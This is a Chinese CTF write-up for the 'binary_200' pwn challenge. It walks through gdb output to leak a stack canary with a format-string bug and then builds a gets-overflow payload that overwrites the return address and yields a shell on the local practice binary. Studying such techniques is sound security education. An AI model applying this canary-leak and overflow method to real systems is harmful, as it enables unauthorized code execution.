binary_200题目源文件题解:

首先
objdump -d -M intel / disass main 看下程序大体内容  确定大概流程


```
gef➤  checksec
[+] checksec for '/home/evan/res/study_note/pwn/example/pwn200/code/binary_200'
Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

配合代码看出可以通过格式化字符串漏洞泄漏canary 然后在通过第二个gets溢出修改return_addr 设置为`canary_protect_me`。此处的canary是因为buf产生的。所以看main的


main处断点发现

```
    0x804856a <main+0009>      mov    eax, gs:0x14
    0x8048570 <main+000f>      mov    DWORD PTR [esp+0x3c], eax
 →  0x8048574 <main+0013>      xor    eax, eax
    0x8048576 <main+0015>      mov    eax, ds:0x804a060
```

从gs:0x14处获取canary 然后存放在esp+0x3c处 

查看canary 为`0x7939b200`

```
gef➤  reg
$eax   : 0x7939b200
$ebx   : 0x0       
$ecx   : 0x7aac3b3b
$edx   : 0xffffd0d4  →  0x00000000
$esp   : 0xffffd050  →  0xf7fac000  →  0x001e3d6c
$ebp   : 0xffffd098  →  0x00000000
$esi   : 0xf7fac000  →  0x001e3d6c
$edi   : 0xf7fac000  →  0x001e3d6c

gef➤  x/wx $esp+0x3c
0xffffd08c:     0x7939b200
gef➤  

```




然后通过printf处断点去确定位置。 中间有个gets 我们输入AAAA 步进到printf 


```
gef➤  disass main
Dump of assembler code for function main:
   0x08048561 <+0>:     push   ebp
   0x08048562 <+1>:     mov    ebp,esp
   0x08048564 <+3>:     and    esp,0xfffffff0
   0x08048567 <+6>:     sub    esp,0x40
   0x0804856a <+9>:     mov    eax,gs:0x14
   0x08048570 <+15>:    mov    DWORD PTR [esp+0x3c],eax
=> 0x08048574 <+19>:    xor    eax,eax
   0x08048576 <+21>:    mov    eax,ds:0x804a060
   0x0804857b <+26>:    mov    DWORD PTR [esp+0xc],0x0
   0x08048583 <+34>:    mov    DWORD PTR [esp+0x8],0x2
   0x0804858b <+42>:    mov    DWORD PTR [esp+0x4],0x0
   0x08048593 <+50>:    mov    DWORD PTR [esp],eax
   0x08048596 <+53>:    call   0x8048440 <setvbuf@plt>
   0x0804859b <+58>:    mov    eax,ds:0x804a040
   0x080485a0 <+63>:    mov    DWORD PTR [esp+0xc],0x0
   0x080485a8 <+71>:    mov    DWORD PTR [esp+0x8],0x1
   0x080485b0 <+79>:    mov    DWORD PTR [esp+0x4],0x0
   0x080485b8 <+87>:    mov    DWORD PTR [esp],eax
   0x080485bb <+90>:    call   0x8048440 <setvbuf@plt>
   0x080485c0 <+95>:    lea    eax,[esp+0x14]
   0x080485c4 <+99>:    mov    DWORD PTR [esp],eax
   0x080485c7 <+102>:   call   0x80483f0 <gets@plt>
   0x080485cc <+107>:   lea    eax,[esp+0x14]
   0x080485d0 <+111>:   mov    DWORD PTR [esp],eax
   0x080485d3 <+114>:   call   0x80483e0 <printf@plt>
gef➤  b *0x080485d3
Breakpoint 2 at 0x80485d3: file stackguard.c, line 16.
```

继续执行并且输入`AAAA`

```
gef➤  telescope $esp -l 24
0xffffd050│+0x0000: 0xffffd064  →  "AAAA"        ← $esp
0xffffd054│+0x0004: 0x00000000
0xffffd058│+0x0008: 0x00000001
0xffffd05c│+0x000c: 0x00000000
0xffffd060│+0x0010: 0xf7fac3fc  →  0xf7fad2c0  →  0x00000000
0xffffd064│+0x0014: "AAAA"
0xffffd068│+0x0018: 0x0804a000  →  0x08049f14  →  <_DYNAMIC+0000> add DWORD PTR [eax], eax
0xffffd06c│+0x001c: 0x08048652  →  <__libc_csu_init+0052> add edi, 0x1
0xffffd070│+0x0020: 0x00000001
0xffffd074│+0x0024: 0xffffd144  →  0xffffd2fe  →  "/home/evan/res/study_note/pwn/example/pwn200/code/[...]"
0xffffd078│+0x0028: 0xffffd14c  →  0xffffd33b  →  "SHELL=/bin/bash"
0xffffd07c│+0x002c: 0xf7dfbd45  →  <__cxa_atexit+0025> add esp, 0x1c
0xffffd080│+0x0030: 0xf7fe3230  →  <_dl_fini+0000> push ebp
0xffffd084│+0x0034: 0x00000000
0xffffd088│+0x0038: 0x0804860b  →  <__libc_csu_init+000b> add ebx, 0x19f5
0xffffd08c│+0x003c: 0x7939b200
gef➤  p 0xffffd09c-0xffffd090
$3 = 0xc
```

这边计算args `0xffffd08c-0xffffd054`  在除以4那就是15 那么就通过%15$x获取canary


并且计算canary到return_addr之间需要填充的长度为`0xc`

那么第二个payload就是"A"*0x28+canary+"A"*0xc+return_addr

最后disass 得到`canary_protect_me`的地址`0x0804854d` 作为return_addr.

结果如下

```
[+] Starting local process './binary_200': pid 23007
/home/evan/res/study_note/pwn/example/pwn200/code/pwn200.py:5: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline("%15$x")
[*] canary: 0xf96bf000
[*] Switching to interactive mode
$ ls
answer.md  binary_200  pwn200.c  pwn200.py  txt  txt_200
```


